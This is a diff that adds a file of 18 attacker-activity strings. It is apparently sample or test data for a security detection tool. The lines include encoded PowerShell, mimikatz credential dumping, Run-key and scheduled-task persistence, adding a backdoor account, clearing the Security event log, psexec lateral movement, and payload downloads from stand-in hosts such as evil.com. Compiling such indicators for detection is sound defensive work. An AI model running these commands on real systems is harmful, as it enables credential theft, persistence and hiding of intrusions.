@@ -1,0 +1,18 @@
+powershell -enc ZABvAHcAbgBsAG8AYQBk executing encoded payload
+mimikatz sekurlsa::logonpasswords credential dumping
+schtasks /create /tn backdoor /tr C:\malware.exe
+curl http://malicious-site.com/beacon.sh
+net user hacker P@ssw0rd /add
+rundll32 javascript:void(document.write())
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v backdoor
+wevtutil cl Security clear event log
+ransomware encrypted all files with .locked extension
+rdp brute force attempt on port 3389
+cmd /c whoami && systeminfo
+ssh -L 8080:internal:80 attacker@pivot
+nmap -sS -p 1-1024 192.168.1.0/24
+psexec \\target -u admin -p password cmd.exe
+certutil -urlcache -split -f http://evil.com/payload.exe
+phishing email with malicious attachment received
+sql injection exploit on public-facing web application rce CVE-2024-1234
+base64 encoded obfuscated script downloaded
